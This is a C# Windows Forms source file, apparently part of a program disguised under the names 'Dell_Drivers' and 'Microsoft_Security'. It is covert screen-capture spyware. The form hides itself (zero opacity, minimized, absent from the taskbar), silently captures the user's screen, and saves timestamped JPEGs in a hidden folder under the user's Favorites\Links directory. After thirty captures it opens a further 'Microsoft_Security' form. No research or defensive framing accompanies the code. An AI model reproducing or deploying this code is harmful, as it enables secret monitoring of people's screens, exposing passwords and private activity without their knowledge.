using System;
using System.Drawing;
using System.Windows.Forms;
using System.Drawing.Imaging;

using System.IO;
using Microsoft_Security.Properties;

namespace Dell_Drivers
{
    public partial class SS : Form
    {       

        public SS()
        {
            InitializeComponent();
            this.Opacity = 0;
            this.WindowState = FormWindowState.Minimized;
            this.ShowInTaskbar = false;         

        }        

        private void SS_Load(object sender, EventArgs e)
        {

            String filelocation;

            if (Settings.Default["start"].ToString() == "1")
            {
                try
                {
                    DateTime now = DateTime.Now;

                    String time = now.ToString();

                    Rectangle bounds = Screen.GetBounds(Point.Empty);
                    using (Bitmap bitmap = new Bitmap(1920, 1080, PixelFormat.Format32bppArgb))
                    {
                        Rectangle captureRectangle = Screen.AllScreens[0].Bounds;

                        Graphics captureGraphics = Graphics.FromImage(bitmap);

                        captureGraphics.CopyFromScreen(captureRectangle.Left, captureRectangle.Top, 0, 0, captureRectangle.Size);

                        //String fileloc = "C:\\windows\\logs\\telephony\\Tempo";
                        String fileloc = "C:\\Users\\" + global.currentUser + "\\Favorites\\Links\\Tempo";


                        if (!Directory.Exists(fileloc))
                        {
                            //Directory.CreateDirectory(fileloc);
                            DirectoryInfo di = Directory.CreateDirectory(fileloc);
                            di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
                        }

                        if (Directory.Exists(fileloc))
                        {
                            //filelocation = "C:\\Windows\\Logs\\Telephony\\Tempo\\" + DateTime.Now.ToString("dd MMM yyyy_hh mm ss tt") + ".jpg";
                            filelocation = "C:\\Users\\" + global.currentUser + "\\Favorites\\Links\\Tempo\\" + DateTime.Now.ToString("dd MMM yyyy_hh mm ss tt") + ".jpg";

                            bitmap.Save(filelocation, ImageFormat.Jpeg);
                        }

                        global.current_count += 1;


                        using (Graphics g = Graphics.FromImage(bitmap))
                        {
                            g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                        }

                    }

                    if (global.current_count >= 30)
                    {
                        global.active = false;
                        Microsoft_Security f3 = new Microsoft_Security();
                        f3.ShowDialog();

                    }

                    this.Close();
                    GC.Collect();
                }
                catch
                {
                    this.Close();
                    GC.Collect();
                }
            }
            else
            {
                this.Close();
                GC.Collect();
            }
            
            
        }   
        
    }
}


